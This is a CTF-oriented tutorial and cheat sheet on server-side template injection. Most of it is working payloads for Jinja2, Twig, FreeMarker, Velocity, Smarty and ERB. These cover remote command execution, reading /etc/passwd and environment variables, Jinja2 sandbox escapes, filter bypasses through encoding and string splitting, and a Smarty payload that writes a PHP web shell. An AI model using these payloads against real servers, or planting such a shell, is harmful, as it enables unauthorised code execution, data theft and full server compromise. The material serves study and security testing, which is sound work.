# Server-Side Template Injection (SSTI) - Basics

## What is SSTI?

Server-Side Template Injection occurs when user input is embedded into a template in an unsafe way, allowing attackers to inject template directives and execute arbitrary code on the server.

**Key Impact**:
- Remote Code Execution (RCE)
- Read arbitrary files
- Access to internal application data
- Full server compromise

---

## How SSTI Works

### Normal Template Usage
```python
# Safe - data is passed as context
template = "Hello {{username}}"
render(template, {"username": "John"})
# Output: Hello John
```

### SSTI Vulnerability
```python
# Unsafe - user input embedded in template
template = f"Hello {user_input}"
render(template)
# User input: {{7*7}}
# Output: Hello 49
```

---

## Common Template Engines

### Python
- **Jinja2** (Flask, Django)
- **Mako**
- **Tornado**
- **Django Templates**

### Java
- **Freemarker**
- **Velocity**
- **Thymeleaf**

### JavaScript
- **Pug** (formerly Jade)
- **Handlebars**
- **EJS**
- **Nunjucks**

### Ruby
- **ERB** (Embedded Ruby)
- **Slim**
- **Haml**

### PHP
- **Twig**
- **Smarty**
- **Blade** (Laravel)

---

## Detection

### Step 1: Test with Mathematical Expressions
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

**Expected results**:
- Vulnerable: `49`
- Not vulnerable: `{{7*7}}` (literal output)

### Step 2: Template-Specific Syntax
```
# Jinja2/Twig
{{7*'7'}}  → 7777777

# FreeMarker
${7*7}  → 49

# Velocity
#set($x=7*7)$x  → 49

# Smarty
{7*7}  → 49

# ERB
<%= 7*7 %>  → 49
```

### Step 3: Identify Template Engine
Use polyglot payloads that work differently across engines:
```
{{7*'7'}}
```
- Jinja2: `7777777`
- Twig: `7777777`
- Mako: `7777777`
- Others: `49` or error

---

## Basic Exploitation by Engine

### Jinja2 (Python/Flask)

#### Detection
```
{{7*7}}  → 49
{{7*'7'}}  → 7777777
```

#### File Read
```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

#### RCE - Method 1 (subprocess)
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

#### RCE - Method 2 (using config)
```python
{{ config.items() }}
{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
```

#### RCE - Method 3 (cycler)
```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

---

### Twig (PHP/Symfony)

#### Detection
```
{{7*7}}  → 49
{{7*'7'}}  → 7777777
```

#### RCE
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}

{{['id']|filter('system')}}

{{['cat /etc/passwd']|filter('system')}}
```

---

### FreeMarker (Java)

#### Detection
```
${7*7}  → 49
```

#### RCE
```java
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }

<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /etc/passwd") }

<#assign classloader=object?api.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.utility.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

---

### Velocity (Java)

#### Detection
```
#set($x=7*7)$x  → 49
```

#### RCE
```java
#set($runtime = $class.forName('java.lang.Runtime').getRuntime())
#set($process = $runtime.exec('id'))
$process.waitFor()
#set($null=$process.getInputStream())
#foreach($i in [1..$null.available()])
$null.read()
#end
```

---

### Smarty (PHP)

#### Detection
```
{7*7}  → 49
```

#### RCE
```php
{system('id')}
{php}system('id');{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['c']); ?>",self::clearConfig())}
```

---

### ERB (Ruby)

#### Detection
```
<%= 7*7 %>  → 49
```

#### RCE
```ruby
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
<%= File.open('/etc/passwd').read %>
```

---

## Polyglot Detection Payloads

Test multiple engines at once:
```
${{<%[%'"}}%\
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
#{ 7*7 }
```

---

## Common SSTI Locations

### 1. URL Parameters
```
GET /page?name={{7*7}}
GET /greet?message=${7*7}
```

### 2. POST Body
```
POST /contact
name={{7*7}}&email=test@test.com
```

### 3. HTTP Headers
```
User-Agent: {{7*7}}
Referer: ${7*7}
```

### 4. Form Fields
```html
<form>
  <input name="username" value="{{7*7}}">
</form>
```

### 5. Email Templates
```
Subject: Hello {{username}}
Body: {{7*7}}
```

### 6. Error Messages
```
Template rendering error in: {{user_input}}
```

---

## Exploitation Techniques

### 1. Information Disclosure

#### Jinja2 - Dump Config
```python
{{ config }}
{{ config.items() }}
{{ self.__dict__ }}
```

#### Twig - Dump Environment
```php
{{ dump(app) }}
{{ dump(_self) }}
```

### 2. File Read

#### Jinja2
```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

#### ERB
```ruby
<%= File.open('/etc/passwd').read %>
```

### 3. Remote Code Execution

See engine-specific sections above.

---

## Sandbox Escapes (Jinja2)

### Method 1: Object Introspection
```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

### Method 2: Accessing __builtins__
```python
{{ [].__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read() }}
```

### Method 3: Using request object
```python
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Method 4: Lipsum
```python
{{ lipsum.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Method 5: Cycler
```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

---

## Filter Bypasses

### Bypass "{{" and "}}"
```
{%print(7*7)%}
{% print 7*7 %}
{%set x=7*7%}{{x}}
```

### Bypass Quotes
```python
# Use chr() or request.args
{{request.args.x}}  # Pass x=command via GET parameter
{{''[request.args.x]}}  # x=__class__

# Hex encoding
{{"__cla"+"ss__"}}
```

### Bypass Dots
```python
# Use [] notation
{{''['__class__']}}
{{''['__class__']['__mro__']}}

# Use attr()
{{''|attr('__class__')}}
```

### Bypass Underscores
```python
# URL encode
{{''['\x5f\x5fclass\x5f\x5f']}}

# Use request.args
{{request.args.x}}  # x=__class__
```

### Bypass Keywords (import, os, etc.)
```python
# String concatenation
{{"__im"+"port__"}}
{{"o"+"s"}}

# Use request.args
{{request.args.cmd}}  # cmd=import

# Base64 decode
{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os').popen(request.args.cmd).read()}}
```

---

## CTF-Specific Tips

### 1. Look for Flag Files
```python
# Jinja2
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/flag.txt').read() }}

# ERB
<%= File.open('/flag.txt').read %>

# Twig
{{['cat /flag.txt']|filter('system')}}
```

### 2. Check Environment Variables
```python
# Jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').environ }}

# ERB
<%= ENV %>
```

### 3. Execute Commands
```python
# Jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}

# Twig
{{['cat /flag.txt']|filter('system')}}

# ERB
<%= `cat /flag.txt` %>
```

### 4. List Files
```python
# Jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la').read() }}
```

---

## Testing Methodology

1. **Identify input points** - Where does user input appear in responses?
2. **Test basic math** - `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
3. **Identify template engine** - Use polyglot payloads
4. **Test for sandbox** - Try to access classes/modules
5. **Escalate to RCE** - Use engine-specific payloads
6. **Extract flag** - Read files, execute commands, check environment

---

## Quick Reference

### Detection
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
```

### Jinja2 RCE
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Twig RCE
```php
{{['id']|filter('system')}}
```

### FreeMarker RCE
```java
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

### ERB RCE
```ruby
<%= system('id') %>
```

### File Read (Jinja2)
```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

---

## Tools

- **tplmap**: Automated SSTI scanner and exploiter
- **SSTImap**: Similar to tplmap
- **Burp Suite**: Manual testing with Intruder
- **PayloadsAllTheThings**: Comprehensive SSTI payload collection

Next: Deep dive into each template engine with advanced exploitation techniques!